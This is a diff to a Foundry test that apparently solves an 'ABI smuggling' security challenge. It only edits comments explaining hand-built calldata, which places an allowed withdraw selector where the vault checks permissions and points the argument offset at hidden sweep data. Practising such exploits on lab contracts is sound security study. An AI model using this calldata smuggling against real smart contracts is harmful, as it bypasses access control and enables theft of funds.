@@ -98,16 +98,17 @@ contract ABISmugglingChallenge is Test {
             bytes4(0x1cff79cd),
             //address of target which i want execute to work with
             bytes32(uint256(uint160(address(vault)))),
-            //we offset to 0x80
-            //This moves the actual actionData 64 bytes further into the calldata than usua
+            //we offset to 0x80(128) where the length of dynamic argument is stored
+            
 
             bytes32(uint256(0x80)),
             //we pad the next 32 bytes
             bytes32(0),
             // we put the first 4 bytes of withdraw selector which we are permitted to run at start followed by 28 zeroes
             bytes32(uint256(uint32(0xd9caed12)) << 224),
-            //the bytes which offset points to and low level call runs when triggered
+            // the bytes that store the length of dynmaic arguments and offset points to
             bytes32(uint256(sweepData.length)),
+            //the bytes at which the actual dynamic  arguments are stored
             sweepData
         );
         (bool success, ) = address(vault).call(rawCallData);
